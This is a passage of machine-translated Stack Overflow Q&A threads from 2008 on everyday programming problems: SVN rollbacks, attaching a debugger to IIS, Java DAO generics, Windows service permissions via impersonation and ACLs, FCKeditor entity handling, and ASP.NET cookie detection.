我已经开始在我的网站上使用[jQuery](http://jquery.com) for JavaScript。它消除了跨浏览器 JavaScript 差异的所有担忧——比如类和类名，以及 getElementById。它还包括一些非常方便和简单的 AJAX 回发功能。如果使用得当，它非常容易学习并且非常轻巧。

我在 Stack Overflow 上看到了 AJAX 的一些很好的用法，比如标签选择器和键入问题标题时的问题查找。我认为这些简单的事情效果最好；我们只是通过对直观功能的少量添加来增加用户体验，我们不会用拖放手柄等来淹没屏幕。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-16T21:30:36.800

我经常不得不为老式的 ASP.NET 2.0 站点启用 Ajax。我发现最简单的方法是创建一个新的启用 Ajax 的站点，然后将 web.config 的某些部分复制并粘贴到旧项目的 web.config 中。

只需比较两者，看看您的旧版本中缺少什么。您显然还需要添加对 AjaxExtensions 和 AjaxControlToolkit 的引用。

# c++ - 没有 .h 的标头的 Visual Studio 智能感知

> ID：210247
> 
> 赞同：15
> 
> 时间：2008-10-16T20:49:13.200
> 
> 标签：c++, visual-studio-2008, qt4

我正在使用一个没有 .h 的标题的库
这会破坏 Visual Studio 的智能感知（声明/定义查找）

有人知道如何告诉 VS2008 文件是标题吗？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-16T21:06:19.237

转到 Visual Studio 中的 Tools::Options::Text Editor::File Extension 选项卡。选中“映射无扩展标题”复选框，然后从组合框中选择所需的语言。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-16T21:05:53.807

我冒昧地猜测您应该确保标头包含在源文件（通常是 .cpp 文件）中。

其中源文件的属性将 Tool 属性设置为 C/C++ Compiler Tool。我猜 Intellisense 是从它们开始的，并且会遵循 #includes 到文件，而不管它们的扩展名是什么，以从它遇到的任何东西中构建它的符号数据库。

# svn - 使用 Subversion 回滚更改集的最佳方法是什么？

> ID：210249
> 
> 赞同：15
> 
> 时间：2008-10-16T20:49:20.580
> 
> 标签：svn, version-control

我一直在使用各种源代码控制系统，但在恢复更改方面我还不是专家。鉴于这种情况，有人可以帮忙吗：

## 设想

*   鉴于修订版 #5 中引入了一个错误
*   修订版 #5 中更改了 3 个文件
*   并且 2 个文件中的更改是导致该错误的原因
*   当客户在修订版 #9 (HEAD) 的版本中发现错误时
*   然后必须将导致修订版 #5 中的错误的文件中的 2 个恢复到修订版 #4
*   并且从修订 #6 到 HEAD 的更改必须应用于这两个文件

我希望必须有一种方法来比较两个文件的修订 #4 和 #5，并生成一个补丁来撤消修订 #5 中的更改，然后可以将其应用于 HEAD 修订以回滚缺陷。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-16T20:58:55.693

通常[反向合并](http://svnbook.red-bean.com/en/1.5/svn-book.html#svn.branchmerge.basicmerging.undo)足以回滚已提交的更改...

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-30T11:07:08.917

要阅读详细信息，请参阅： [svn manual - Undoing Changes](http://svnbook.red-bean.com/en/1.8/svn.branchmerge.basicmerging.html#svn.branchmerge.basicmerging.undo)

正如标记所描述的那样，您将要执行以下操作：
svn merge -r 5:4 file1 file2
这意味着从 4 到 5 的更改向后合并，即。撤消更改

您也可以输入：
svn merge -c -5 file1 file2
这意味着应用在向后提交修订版 5 时发生的更改。

接下来，您应该手动查看更改。

最后，您必须提交更改（以上合并仅更改了您的工作副本）。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-16T20:56:10.643

这是一个[svn](http://svnbook.red-bean.com/en/1.8/svn.tour.history.html)书籍的链接，解释了所有关于还原和历史的信息。

要进行差异，您可以执行类似 svn diff -r 4:5 somefile.txt

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-16T20:58:59.563

我假设您在我的回答中使用 TortoiseSVN。

我认为您的方案不会导致文件回滚，因为您仍然希望保留每个文件的历史记录。大多数时候，您要做的只是找到并修复错误，然后对该文件进行新的更改。

如果要比较两个版本，在tortoiseSvn 中很容易，右键单击文件，然后进入TortoiseSvn->Show Log。然后选择要比较的两个版本，右键单击然后比较版本。

如果你想找出谁对这个 bug 负责，你可以使用 TortoiseSVN 中的 Blame 菜单项... 这会让你知道是谁修改了每一行以及在哪个修订版上。

哦，如果你想把一个文件恢复到以前的版本，你可以在 TortoiseSvn->Show Log 中这样做，然后你选择你想恢复到的版本，右键单击并选择 Revert to this revision。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-01-23T09:49:06.470

I would go with EtienneT's answer. But beneath "Revert to this revision", there is also the option "Revert changes from this revision". That option would perfectly fit Robert Walker's needs to undo the changes from revision #5\. Don't forget to commit the changes.

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-16T20:56:31.940

查看当前版本，然后 svn merge -r 5:4 file1 file2 （来自内存，可能不完全正确）

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-16T21:05:40.703

我认为您需要先在 5:4 之间反向合并，然后还原正确的文件

1.  svn 合并 -r 5:5 [http://svn.example.com/repos/calc/trunk](http://svn.example.com/repos/calc/trunk)

2.  svn 恢复正确文件

您可能最终会在 2buggy 文件上处于奇怪的状态，希望您可以手动解决。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-16T20:54:49.447

如果您使用的是[http://tortoisesvn.tigris.org/](http://tortoisesvn.tigris.org/)，那么这是一个相当简单的过程。只需右键单击文件并选择“日志”以获取从现在到选定的恢复之间的更改列表。然后就是将这两个文件恢复到修订版 #4 并提交更改 :)

# asp.net - 如何将调试器附加到 IIS 而不是 ASP.NET 开发服务器？

> ID：210250
> 
> 赞同：70
> 
> 时间：2008-10-16T20:49:40.703
> 
> 标签：asp.net, debugging

我有一个 ASP.NET 网站，当我按 F5 时它会自动附加到 ASP.NET 开发服务器，当我按 F5 时如何附加到 IIS 工作进程？

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2008-10-16T20:51:16.740

调试->附加到进程...

从列表中选择**aspnet_wp.exe**进程。

如果您正在运行**IIS > 版本 5**，则该进程将为**w3wp.exe**，并且每个应用程序池都有一个（因此，如果您不知道要访问哪个应用程序池，则需要附加到所有其中）。

* * *

## 回答 #2

> 赞同：50
> 
> 时间：2008-10-16T20:50:40.500

打开项目属性，转到 Web 选项卡并选择 IIS 选项。

这实际上在 IIS 中启动了一个应用程序实例并附加了调试器。如果您只想附加到现有的 IIS 实例，请从调试菜单中选择附加到进程。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2011-12-08T22:18:10.217

从 VS 菜单调试 -> 附加到进程。

为了知道要附加到哪个 w3wp.exe 进程，您可以在 2008 服务器上使用以下命令

```
c:\%systemroot%\system32\inetsrv\appcmd list wp 
```

在 Windows 2003 上，它是

```
c:\%systemroot%\system32\cscript iisapp.vbs 
```

有关详细信息，请参阅[IIS 应用程序池 PID](https://stackoverflow.com/questions/748927/iis-application-pool-pid)。

但是，如果您有权访问任务管理器 (taskmgr.exe)，您可以在那里直接看到进程的名称以及进程 ID，并且在大多数情况下，进程的“用户名”列将与应用程序相同池名称，（当然，您必须将这些列设置为在任务管理器中可见才能查看信息）。

但请注意，所有方法都将仅显示当前正在运行的进程，这意味着如果您的特定进程由于空闲时间而关闭，您必须首先使用该站点才能在列表中显示该进程。

此外，如果应用程序是“Web Garden”（其中有多个 w3wp.exe），那么即使在附加到正确的进程之后，仍然不能保证会命中断点，因为到该站点的流量可能会被定向到另一个过程。

另请注意，如果您附加到在发布模式下运行的应用程序，它将改为在调试模式下运行，这意味着例如不会有超时限制（如果您实际上尝试这样做可能会有点问题）解决超时错误）。

如果要附加到远程进程，最佳做法是：

1.  通过打开相关端口或完全禁用它来确保防火墙没有被阻塞（只要记住在完成后再次打开它）。

2.  您应该在远程计算机上拥有一个具有管理权限的 Windows 域帐户，或者在远程计算机上拥有一个与运行 VS 的本地计算机具有相同用户名和密码的帐户。

3.  在安装了 VS 的机器上导航到（Visual Studio 安装路径）\Microsoft Visual Studio（当前版本号）\Common7\IDE\Remote Debugger（远程机器版本），然后将此文件夹复制并粘贴到远程机器或共享此文件夹文件夹，以便可以从远程计算机访问它。

4.  在远程计算机上以与本地计算机相同的用户身份登录（参见步骤 2），从那里导航到步骤 3 的复制或共享文件夹，然后右键单击“msvsmon.exe”并从上下文菜单中选择“运行方式”行政人员”。

5.  远程监视器应该启动并声称它通常以（用户）@（远程机器）的名称或任何其他名称启动服务器。

6.  在 VS 中，从菜单中选择 Debug -> Attach To Process，将传输保留为“默认”，并为“限定符名称”输入步骤 5 中的名称。
    如果一切正常，这将显示远程计算机上的进程列表.

当然，这个主题还有很多内容，对于调试本机代码，过程可能会更简单，但我在此处列出的步骤应该适用于所有情况。

有关更多信息，您可以查看[http://www.codeproject.com/KB/aspnet/IISRemoteDebugging.aspx](http://www.codeproject.com/KB/aspnet/IISRemoteDebugging.aspx)或 MSDN，以及该站点上的许多帖子。

希望这会有所帮助。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-03-22T18:55:32.060

或者，您可以使用[附加到 IIS 插件之一](http://visualstudiogallery.msdn.microsoft.com/site/search?f%5B0%5D.Type=RootCategory&f%5B0%5D.Value=tools&f%5B1%5D.Type=Tag&f%5B1%5D.Value=attach%20to%20iis)到 Visual Studio。

我首选的扩展是 VSCommands（适用于[VS 2010 - 2012](http://visualstudiogallery.msdn.microsoft.com/a83505c6-77b3-44a6-b53b-73d77cba84c8?SRC=Featured)或[2013](https://visualstudiogallery.msdn.microsoft.com/c6d1c265-7007-405c-a68b-5606af238ece)，但还不是 2015）或[ReAttach](https://marketplace.visualstudio.com/items?itemName=ErlandR.ReAttach)（适用于 2017 年）。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-10-16T20:51:06.940

转到 Web 应用程序的属性。选择“开始选项”部分，然后将“使用默认 Web 服务器”更改为“使用自定义服务器”。在基本 URL 中输入“ [http://localhost ”。](http://localhost)

（假设 VS 2008）

# xml - 闪存 AS2.0 - 读取 来自 XML 的标签

> ID：210256
> 
> 赞同：0
> 
> 时间：2008-10-16T20:51:16.427
> 
> 标签：xml, flash, actionscript-2

我有一个 XML 文档，包含在其中一个节点中，我有`<li>`标签。我不需要`<ul></ul>`Flash 的标签，因为它只接受`<li>`标签。例如，下面是 XML 文档的一部分：

```
<node>
 <li>item1</li>
 <li>item2</li>
</node> 
```

我想将`<node>`标签中的所有数据*与 bullets 一起*放入 Flash 8 中的 TextArea 组件中。请注意，我的 textArea 设置为接受 HTML，并且

```
textArea.text = "<li>This is bulleted text</li>"; 
```

工作得很好。但是，`<li>`XML 文档中的标记被解释为完全不同的节点，这显然是我不想要的。

我尝试在 XML 中使用 CDATA 标记，它输入了`<node>`标记之间的所有内容，*包括*`<li>`带有所有括号的标记。这样做是因为`<li>`' 的括号被解释为等效的 "& lt;" 和“>” 对于左/右括号。

所以现在我在我的 XML 文件中遇到了一个无法读入 Flash 的无序列表。除非，当然，这里有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-10-17T11:26:46.270

您是否将文本放入 htmlText-property 中？

```
// you posted:
textArea.text = "<li>This is bulleted text</li>";
// it should be:
textArea.htmlText = "<li>This is bulleted text</li>"; 
```

另外，请尝试将标签以大写形式显示，因为 as2 可能对此有点挑剔。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-17T13:48:59.587

我想到了。结果我把 .firstChild 放在了我的 XML 导航字符串的末尾，这意味着它会忽略所有额外的`<li>`标签。只需删除 .firstChild 并返回节点之间的所有内容，这意味着 Flash 可以读取`<li>`标签。

# cocoa - 你如何开始调试带有 URL 的 Cocoa 应用程序？

> ID：210261
> 
> 赞同：4
> 
> 时间：2008-10-16T20:51:41.527
> 
> 标签：cocoa, debugging, macos

我正在调试一个 Cocoa 应用程序，它可以充当自定义 URL 协议的处理程序。当我在应用程序启动后单击链接时，应用程序工作正常，但如果在单击链接时尚未启动应用程序，则会导致应用程序崩溃。

有什么方法可以让我在调试器中启动应用程序并“愚弄”它以为我刚刚点击了一个链接？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-21T08:39:07.230

你可以做

```
gdb --wait myAppName 
```

然后单击链接以启动您的应用程序。这将导致您的应用程序在 main 启动之前非常非常早地进入调试器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-16T21:59:26.837

调用 URL 处理程序后，您能否从 XCode 附加到您的进程？您可以尝试在您的 URL 处理程序代码中放置一个模态 NSAlert，以便将其暂停，直到您可以附加到您的进程。

# java - 界面太一般

> ID：210266
> 
> 赞同：3
> 
> 时间：2008-10-16T20:53:22.553
> 
> 标签：java, interface

在我正在使用的 Java 代码中，我们有一个接口来定义我们的数据访问对象 (DAO)。大多数方法采用数据传输对象 (DTO) 的参数。当 DAO 的实现需要引用特定类型的 DTO 时，就会出现问题。然后该方法需要执行一个（对我来说完全不必要的 DTO 到 SpecificDTO 的强制转换。不仅如此，编译器也不能对 DAO 的特定实现强制执行任何类型的类型检查，它应该只将它们的特定类型作为参数DTOs. 我的问题是：我如何以最小的方式解决这个问题？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-16T20:56:20.817

您可以使用泛型：

```
DAO<SpecificDTO> dao = new SpecificDAO();
dao.save(new SpecificDTO());
etc. 
```

你的 DAO 类看起来像：

```
interface DAO<T extends DTO> {
    void save(T);
}

class SpecificDAO implements DAO<SpecificDTO> {
    void save(SpecificDTO) {
        // implementation.
    }
    // etc.
} 
```

SpecificDTO 将扩展或实现 DTO。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-17T16:13:13.523

重构为泛型是不小的痛苦（尽管它很可能是值得的）。

如果代码像这样使用您的 DTO 接口，这将特别可怕：

```
DTO user = userDAO.getById(45);

((UserDTO)user).setEmail(newEmail)

userDAO.update(user); 
```

我已经看到了这一点（以更微妙的方式）。

你可以这样做：

```
public DeprecatedDAO implements DAO
{
    public void save(DTO dto)
    {
        logger.warn("Use type-specific calls from now on", new Exception());
    }
}

public UserDAO extends DeprecatedDAO
{
    @Deprecated
    public void save(DTO dto)
    {
        super.save(dto);
        save((UserDTO)dto);
    }

    public void save(UserDTO dto)
    {
        // do whatever you do to save the object
    }
} 
```

这不是一个*很好的*解决方案，但可能更容易实现；你的遗留代码应该仍然可以工作，但它会产生警告和堆栈跟踪来帮助你找到它们，并且你也有一个类型安全的实现。

# mobile - 软件专利或我可以为我的移动设备编写一个 RSVP 程序吗？

> ID：210270
> 
> 赞同：0
> 
> 时间：2008-10-16T20:54:45.017
> 
> 标签：mobile

我想为我的移动设备编写一个小型[快速串行视觉演示 (RSVP)](http://en.wikipedia.org/wiki/Rapid_Serial_Visual_Presentation)程序，但我意识到有一些与该技术相关的专利问题（[展示 1](http://www.freepatentsonline.com/EP1275051.html)和[展示 2](http://patft.uspto.gov/netacgi/nph-Parser?Sect2=PTO1&Sect2=HITOFF&p=1&u=%2Fnetahtml%2Fsearch-bool.html&r=1&f=G&l=50&d=PALL&RefSrch=yes&Query=PN%2F6056551)）。

我可以编写这样的程序并尝试用它赚钱吗？免费提供这样的程序是否合法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T21:08:23.880

对于这样的事情，您确实需要咨询律师。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-18T09:15:31.667

我没钱请律师。

stackoverflow.com 上没有律师？

;-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T10:18:04.940

细节决定成败。

我建议您写下您的程序将执行的操作 - 以比“它执行 RSVP”更详细的方式。

打印出适当的专利，检查专利中的权利要求，看看你是否在做他们要求的事情。我不认为他们在 RSVP 上申请专利，只是在某些使用它的方式上。

自己判断是否值得继续，如果是，请在继续之前咨询该法律领域的专家律师。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-29T16:07:30.863

IANAL，但是：3 现实检查：1) 对您提出专利侵权索赔将花费大量金钱。2）如果您没有律师的独裁者，那么您现在不值得起诉。所以，问题是，你会从你的想法中赚到足够的钱来值得在未来起诉吗？3) 起诉是最后的手段，你可能会被邀请 a) 将技术许可给你的（巨大的）用户群或 b) 做出“合理的”庭外和解。2 种可能的解决方案：1）祈祷并希望最好，2）通过公司限制您的责任。

免费赠送是否合法？如果您侵犯了他们的专利，则不会。他们的“索赔”将基于他们的销售额损失，而不是您的收入。

# asp.net - .Net 2.0 服务控制器.GetServices()

> ID：210296
> 
> 赞同：5
> 
> 时间：2008-10-16T21:00:18.717
> 
> 标签：asp.net, security, windows-services, .net-2.0

我有一个启用了 Windows 身份验证的网站。从网站中的一个页面，用户可以启动一个对数据库做一些事情的服务。

启动服务对我来说很好，因为我是服务器上的本地管理员。但我只是让一个用户测试它，他们无法启动服务。

我的问题是：

* * *

**有谁知道使用与他们当前登录的帐户不同的 Windows 帐户按名称在指定计算机上获取服务列表的方法？**

* * *

我真的不想将需要启动服务的所有用户添加到 Windows 组中，并将它们全部设置为我的 IIS 服务器上的本地管理员.....

这是我得到的一些代码：

```
public static ServiceControllerStatus FindService()
        {
            ServiceControllerStatus status = ServiceControllerStatus.Stopped;

            try
            {
                string machineName = ConfigurationManager.AppSettings["ServiceMachineName"];
                ServiceController[] services = ServiceController.GetServices(machineName);
                string serviceName = ConfigurationManager.AppSettings["ServiceName"].ToLower();

                foreach (ServiceController service in services)
                {
                    if (service.ServiceName.ToLower() == serviceName)
                    {
                        status = service.Status;
                        break;
                    }
                }
            }
            catch(Exception ex)
            {
                status = ServiceControllerStatus.Stopped;
                SaveError(ex, "Utilities - FindService()");
            }

            return status;
        } 
```

我的异常来自 try 块中的第二行。这是错误：

> System.InvalidOperationException：无法在计算机“server.domain.com”上打开服务控制管理器。此操作可能需要其他权限。---> System.ComponentModel.Win32Exception：访问被拒绝---内部异常堆栈跟踪结束---在 System.ServiceProcess.ServiceController.GetDataBaseHandleWithAccess(String machineName, Int32 serviceControlManaqerAccess) 在 System.ServiceProcess.ServiceController.GetServicesOfType(String machineName, Int32 serviceType) 在 TelemarketingWebSite.Utilities.StartService()

感谢您的帮助/信息

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-17T05:08:56.780

*注意：这并不涉及将服务枚举为不同的用户，但考虑到您正在做的更广泛的描述，我认为这是一个很好的答案。*

如果您直接访问感兴趣的服务，我认为您可以简化很多，并可能避免部分安全问题。而不是调用 GetServices，试试这个：

```
string machineName = ConfigurationManager.AppSettings["ServiceMachineName"];
string serviceName = ConfigurationManager.AppSettings["ServiceName"];
ServiceController service = new ServiceController( serviceName, machineName );
return service.Status; 
```

这直接连接到感兴趣的服务并绕过枚举/搜索步骤。因此，它不需要调用者拥有`SC_MANAGER_ENUMERATE_SERVICE`服务控制管理器 (SCM) 的权限，而远程用户默认没有这些权限。它仍然需要`SC_MANAGER_CONNECT`，但[根据 MSDN](http://msdn.microsoft.com/en-us/library/ms685981.aspx)，应该授予远程经过身份验证的用户。

找到感兴趣的服务后，您仍然需要能够停止和启动它，而您的远程用户可能无权执行此操作。但是，可以修改单个服务的安全描述符 (DACL)，这样您就可以授予远程用户停止和启动服务的权限，而无需他们是本地管理员。这是通过[SetNamedSecurityInfo](http://msdn.microsoft.com/en-us/library/aa379579(VS.85).aspx) API 函数完成的。您需要授予的访问权限是`SERVICE_START`和`SERVICE_STOP`。根据这些用户究竟属于哪些组，您可能还需要授予他们`GENERIC_READ`. 所有这些权利都[在 MSDN 中进行了描述](http://msdn.microsoft.com/en-us/library/ms685981.aspx)。

下面是一些将执行此设置的 C++ 代码，假设感兴趣的用户位于“远程服务控制器”组（您将创建该组）中并且服务名称为“my-service-name”。请注意，如果您想授予对知名组的访问权限，例如用户（不一定是一个好主意）而不是您创建的组，您需要更改`TRUSTEE_IS_GROUP`为`TRUSTEE_IS_WELL_KNOWN_GROUP`.

该代码没有您想要添加的错误检查。所有三个可能失败的函数（Get/SetNamedSecurityInfo 和 SetEntriesInAcl）都返回 0 表示成功。

*另一个注意事项：您也可以使用[SC 工具](http://www.ss64.com/nt/sc.html)设置服务的安全描述符，该工具可以在 %WINDIR%\System32 下找到，但这不涉及任何编程。*

```
#include "windows.h"
#include "accctrl.h"
#include "aclapi.h"

int main()
{
    char serviceName[] = "my-service-name";
    char userGroup[] = "Remote Service Controllers";

    // retrieve the security info
    PACL pDacl = NULL;
    PSECURITY_DESCRIPTOR pDescriptor = NULL;
    GetNamedSecurityInfo( serviceName, SE_SERVICE,
        DACL_SECURITY_INFORMATION, NULL, NULL,
        &pDacl, NULL, &pDescriptor );

    // add an entry to allow the users to start and stop the service
    EXPLICIT_ACCESS access;
    ZeroMemory( &access, sizeof(access) );
    access.grfAccessMode = GRANT_ACCESS;
    access.grfAccessPermissions = SERVICE_START | SERVICE_STOP;
    access.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    access.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    access.Trustee.ptstrName = userGroup;
    PACL pNewDacl;
    SetEntriesInAcl( 1, &access, pDacl, &pNewDacl );

    // write the changes back to the service
    SetNamedSecurityInfo( serviceName, SE_SERVICE,
        DACL_SECURITY_INFORMATION, NULL, NULL,
        pNewDacl, NULL );

    LocalFree( pNewDacl );
    LocalFree( pDescriptor );
} 
```

这也可以在 C# 中使用 P/Invoke 完成，但这需要更多的工作。

如果您仍然特别希望能够将服务枚举为这些用户，则需要授予他们`SC_MANAGER_ENUMERATE_SERVICE`在 SCM 上的权限。不幸的是，[根据 MSDN](http://msdn.microsoft.com/en-us/library/ms685981.aspx)，SCM 的安全性只能在 Windows Server 2003 sp1 或更高版本上进行修改。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T15:34:19.093

感谢查理的那行代码。这就是我最终要做的。我从这个网站得到了这个想法：http: [//www.codeproject.com/KB/cs/svcmgr.aspx?display=Print](http://www.codeproject.com/KB/cs/svcmgr.aspx?display=Print)

我还必须将我正在访问的帐户添加到服务器上的 Power Users 组中。

```
public static ServiceControllerStatus FindService()
        {
            ServiceControllerStatus status = ServiceControllerStatus.Stopped;
    try
            {
                string machineName = ConfigurationManager.AppSettings["ServiceMachineName"];
                string serviceName = ConfigurationManager.AppSettings["ServiceName"].ToLower();

                ImpersonationUtil.Impersonate();

                ServiceController service = new ServiceController(serviceName, machineName);
                status = service.Status;
            }
            catch(Exception ex)
            {
                status = ServiceControllerStatus.Stopped;
                SaveError(ex, "Utilities - FindService()");
            }

            return status;
        } 
```

这是我使用 ImpersonationUtil.Impersonate() 的另一个类：

```
public static class ImpersonationUtil
    {
        public static bool Impersonate()
        {
            string logon = ConfigurationManager.AppSettings["ImpersonationUserName"];
            string password = ConfigurationManager.AppSettings["ImpersonationPassword"];
            string domain = ConfigurationManager.AppSettings["ImpersonationDomain"];

            IntPtr token = IntPtr.Zero;
            IntPtr tokenDuplicate = IntPtr.Zero;
            WindowsImpersonationContext impersonationContext = null;

            if (LogonUser(logon, domain, password, 2, 0, ref token) != 0)
                if (DuplicateToken(token, 2, ref tokenDuplicate) != 0)
                    impersonationContext = new WindowsIdentity(tokenDuplicate).Impersonate();
            //

            return (impersonationContext != null);
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int LogonUser(string lpszUserName, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

        [DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
        public extern static int DuplicateToken(IntPtr hToken, int impersonationLevel, ref IntPtr hNewToken);
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T01:18:51.113

您可以尝试在 web.config 文件中使用 ASP.NET 模拟，并指定具有适当权限的用户帐户：

```
 <system.web>
       <identity impersonate="true" userName="Username" password="Password" />
    </system.web 
```

查看[MSDN 上的这篇文章](http://msdn.microsoft.com/en-us/library/aa292118(VS.71).aspx)。我相信还有其他选项不需要将密码存储在 web.config 文件中，例如将其放在注册表项中。

这将导致 ASP.NET 工作进程在指定用户的上下文而不是登录到 Web 应用程序的用户的上下文中运行。**但是**，这会带来安全问题，我会强烈重新考虑您的设计。您可能需要考虑让 ASP.NET 网页依次向其他实际控制服务的进程（甚至是另一个 Windows 服务）发出请求，或者将请求写入 Windows 服务定期轮询的数据库表。

# javascript - 撰写消息的到字段中带有 X 的漂亮标签？

> ID：210308
> 
> 赞同：0
> 
> 时间：2008-10-16T21:03:07.573
> 
> 标签：javascript

在 Facebook 的 Compose Message 中，出现在 TO 字段中的每个名称都使用带有 X 的漂亮 LABEL。单击 X，然后从 To sender 字段中删除名称。我在其他 web2.0 社交网络应用程序中再次看到了同样的功能。

单击自动完成列表后，是否有开源工具可以让我制作那些漂亮的 X LABELS？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-10-16T21:06:40.483

有一个相当类似于 facebook 的[jQuery 插件](http://wharsojo.wordpress.com/2008/02/18/jquery-facebook-autocomplete/)可以做到这一点。

# javascript - 如何停止 FCKeditor 将 html 实体恢复为其 unicode 字符

> ID：210309
> 
> 赞同：3
> 
> 时间：2008-10-16T21:04:37.460
> 
> 标签：javascript, fckeditor

我在使用 FCKeditor 将源视图中输入的 html 实体恢复为其原始 unicode 表示时遇到问题。例如，当我进入`&euro;`源视图，切换到 html，然后返回源视图时，实体被实际的 € 符号替换。因此，更大的问题是，这个 unicode 字符随后在提交时被发送回服务器，从而导致底层数据库表出现字符编码问题。还有人遇到这个吗？我尝试了许多配置设置组合，但都无济于事。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-16T21:19:52.203

您使用的是哪个版本的 FCKeditor？当前版本是 2.6.3。我在他们的演示中通过复制`&euro;`到源视图中测试了 € 符号，切换回显示，然后返回 HTML，ASCII`&euro;`被正确保留。因此，听起来您的 FCKEditor 安装可能存在配置问题，或者您需要升级。

**编辑：**刚刚在 FCKEditor 文档中找到了这个 gem：http: [//docs.fckeditor.net/FCKeditor_2.x/Developers_Guide/Configuration/Configuration_Options/ProcessNumericEntities](http://docs.fckeditor.net/FCKeditor_2.x/Developers_Guide/Configuration/Configuration_Options/ProcessNumericEntities)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2011-12-19T11:02:03.847

如果你需要 CKEditor 3 的相同设置，你可以使用这个：

```
config.entities = false; 
```

[http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html#.entities](http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html#.entities)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T09:14:48.283

问题是配置设置 - `FCKConfig.ProcessHTMLEntities=true`.

尽管我曾尝试在 fckconfig.js 中更改它，但我没有意识到该值在由以前的开发人员创建的辅助自定义配置文件中被覆盖。

谢谢安妮。

# asp.net - 确定 ASP.NET 中是否启用 cookie 的最佳方法？

> ID：210321
> 
> 赞同：22
> 
> 时间：2008-10-16T21:07:16.520
> 
> 标签：asp.net, cookies

确定用户浏览器是否在 ASP.NET 中启用 cookie 的最佳方法是什么

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-10-16T21:13:02.700

设置一个cookie，强制重定向到某个检查页面并检查cookie。

或者在每个页面加载时设置一个 cookie（如果尚未设置）。例如，我假设这是为了检查是否支持 cookie，以便在他们尝试登录时显示他们需要启用 cookie 的消息。如果访客用户尚未设置 cookie，请将您的登录 cookie 设置为默认值。然后在您的登录页面上，检查用户 cookie，如果未设置，则显示您的消息。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-11-03T15:08:20.723

@Mattew 是正确的，唯一的方法是设置一个 cookie，重定向，然后检查它。这是一个用于执行检查的 C# 函数，您可以将其放入页面加载事件中：

```
private bool cookiesAreEnabled()
{
bool cookieEnabled = false;

if(Request.Browser.Cookies)
{
   //Your Browser supports cookies 
   if (Request.QueryString["TestingCookie"] == null)
   {
     //not testing the cookie so create it
     HttpCookie cookie = new HttpCookie("CookieTest","");
     Response.Cookies.Add(cookie);

     //redirect to same page because the cookie will be written to the client computer, 
     //only upon sending the response back from the server 
     Response.Redirect("Default.aspx?TestingCookie=1")
   }
   else
   {
     //let's check if Cookies are enabled
      if(Request.Cookies["CookieTest"] == null)
      {
        //Cookies are disabled
      }
      else
      {
        //Cookies are enabled
        cookieEnabled = true;
      }   
   }

}
else
{
  // Your Browser does not support cookies
}
return cookieEnabled;
} 
```

* * *

你也可以用 javascript 来做，这样：

```
function cookiesAreEnabled()
{   
    var cookieEnabled = (navigator.cookieEnabled) ? 1 : 0;  

    if (typeof navigator.cookieEnabled == "undefined" && cookieEnabled == 0){   
    document.cookie="testcookie";   
    cookieEnabled = (document.cookie.indexOf("test­cookie") != -1) ? 1 : 0; 
    }   

  return cookieEnabled == 1;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T21:11:00.537

写一个cookie，重定向，看看能不能读到cookie。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-07-04T10:37:31.043

好吧，我想如果我们可以在 Global.ASAX 会话开始中保存 cookie 并在页面上阅读它.. 这不是最好的方法吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-11T09:48:35.120

meda 的 c# 函数可以工作，尽管您必须更改行：

HttpCookie cookie = new HttpCookie("","");

到

HttpCookie cookie = new HttpCookie("CookieTest","CookieTest");

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-09-09T18:16:26.953

本质上与 meda 相同的解决方案，但在 VB.NET 中：

```
Private Function IsCookieDisabled() As Boolean
    Dim currentUrl As String = Request.RawUrl
    If Request.Browser.Cookies Then
        'Your Browser supports cookies 
        If Request.QueryString("cc") Is Nothing Then
            'not testing the cookie so create it
            Dim c As HttpCookie = New HttpCookie("SupportCookies", "true")
            Response.Cookies.Add(c)
            If currentUrl.IndexOf("?") > 0 Then
                currentUrl = currentUrl + "&cc=true"
            Else
